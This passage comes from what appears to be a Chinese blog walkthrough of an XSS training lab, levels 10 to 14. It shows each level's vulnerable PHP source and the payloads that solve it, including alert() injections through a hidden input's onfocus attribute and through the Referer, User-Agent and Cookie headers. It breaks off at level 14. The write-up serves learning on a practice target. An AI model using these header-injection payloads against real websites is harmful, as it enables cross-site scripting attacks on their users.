job!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level10<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level10<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level10.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:0<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>此时的：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>新的type&#x3D;”text”就覆盖了原来的type，就能让输入框显示出来了  </p>
+<p>隐藏的input标签可以插入type&#x3D;”text”显示 </p>
+<p>ai的解释：</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elm">即使最终 <span class="hljs-type">DOM</span> 中有两个 <span class="hljs-keyword">type</span>，但只要浏览器曾经把它当作 text 处理，它就可能：<br><br>在页面上占据空间<br>可以获得焦点<br>可以触发 onfocus<br>而 onfocus 事件不依赖 <span class="hljs-keyword">type</span> 最终值，只要元素能获得焦点即可。<br></code></pre></td></tr></table></figure>
+
+<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>先看一下源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level12.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level11&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+<p>看到$str和$str00都会被转义，但http报头会被引用？<br>那注入点就是在报头了，和ai沟通一波，<br>最后再把上一题的payload拿来用，在http报头加上payload:  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Referer</span>: &#x27;<span class="hljs-string">&quot; onfocus=&quot;</span>alert(<span class="hljs-number">1</span>)<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; &quot;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>依旧先偷看一眼源码：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level13.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level12&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html<br></code></pre></td></tr></table></figure>
+<p>依旧报头注入，这次变成USER_AGENT了<br>也是直接拿上题payload来用：  </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/level12.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&#x27;&quot; onfocus=&quot;alert(1)&quot; type=&quot;text&quot; &quot;<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br></code></pre></td></tr></table></figure>
+
+<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>进页面先有个php语法报错：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level14.php&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level13&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;<br>&lt;br /&gt;<br>&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent <span class="hljs-title function_ invoke__">by</span> (output started at /<span class="hljs-keyword">var</span>/www/html/level13.<span class="hljs-attr">php</span>:<span class="hljs-number">1</span>) in &lt;b&gt;/<span class="hljs-keyword">var</span>/www/html/level13.php&lt;/b&gt; on line &lt;b&gt;<span class="hljs-number">16</span>&lt;/b&gt;&lt;br /&gt;<br>&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;<br>&lt;form id=search&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_link&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_history&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_sort&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_cook&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:<span class="hljs-number">0</span>&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br>```  <br>  <br>看样子是无法解析报头  <br><br>开源码看看：<br><br>```php<br>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level14.php&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level13&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+<p>e，是cookie吗<br>那在cookie注入即可：  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /level13.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;129&quot;</span>, <span class="hljs-string">&quot;Not=A?Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span><br><span class="hljs-attribute">sec</span>-ch-ua-mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Cookie</span>: user=&#x27;%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>onfocus%<span class="hljs-number">3</span>d%<span class="hljs-number">22</span>alert(<span class="hljs-number">1</span>)%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>type%<span class="hljs-number">3</span>d%<span class="hljs-number">22</span>text%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>%<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>这关加载了一个奇怪的图片？  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;title&gt;欢迎来到level14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=<span class="hljs-string">&quot;leftframe&quot;</span> marginwidth=<span class="hljs-number">10</span> marginheight=<span class="hljs-number">10</span> src=<span class="hljs-string">&quot;http://www.exifviewer.org/&quot;</span> frameborder=no width=<span class="hljs-string">&quot;80%&quot;</span> scrolling=<span class="hljs-string">&quot;no&quot;</span> height=<span class="hljs-number">80</span>%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xss/level15.php?src=<span class="hljs-number">1</span>.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>看看源码吧：  </p>
